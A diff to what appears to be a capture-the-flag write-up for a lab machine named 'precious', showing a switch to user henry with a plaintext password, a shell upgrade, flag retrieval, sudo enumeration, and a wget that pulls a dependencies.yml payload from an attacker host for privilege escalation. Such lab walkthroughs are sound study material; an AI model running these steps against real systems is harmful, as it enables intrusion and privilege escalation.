@@ -113,10 +113,16 @@ ruby@precious:/var/www/pdfapp$ su henry
 su henry
 Password: Q3c1AqGHtoI0aXAYFH
 
-henry@precious:/var/www/pdfapp$
+
+id
+uid=1000(henry) gid=1000(henry) groups=1000(henry)
 
 
-henry@precious:/var/www/pdfapp$ cat /home/henry/user.txt
+SHELL=/bin/bash script -q /dev/null
+henry@precious:~$
+
+
+henry@precious:~$ cat /home/henry/user.txt
 cat /home/henry/user.txt
 e3948152e2e4cd28f2c967ffcc412a53
 ```
@@ -124,7 +130,7 @@ e3948152e2e4cd28f2c967ffcc412a53
 
 ## STEP 4
 ```sh
-henry@precious:/var/www/pdfapp$ sudo -l
+henry@precious:~$ sudo -l
 sudo -l
 Matching Defaults entries for henry on precious:
     env_reset, mail_badpass,
@@ -164,4 +170,22 @@ gems_file.each do |file_name, file_version|
         end
     end
 end
+```
+
+```sh
+henry@precious:~$ cd /home/henry
+cd /home/henry
+
+
+henry@precious:~$ wget http://10.10.16.4/dependencies.yml
+wget http://10.10.16.4/dependencies.yml
+--2025-07-02 10:08:12--  http://10.10.16.4/dependencies.yml
+Connecting to 10.10.16.4:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 667 [application/yaml]
+Saving to: ‘dependencies.yml’
+
+     0K                                                       100%  119M=0s
+
+2025-07-02 10:08:14 (119 MB/s) - ‘dependencies.yml’ saved [667/667]
 ```
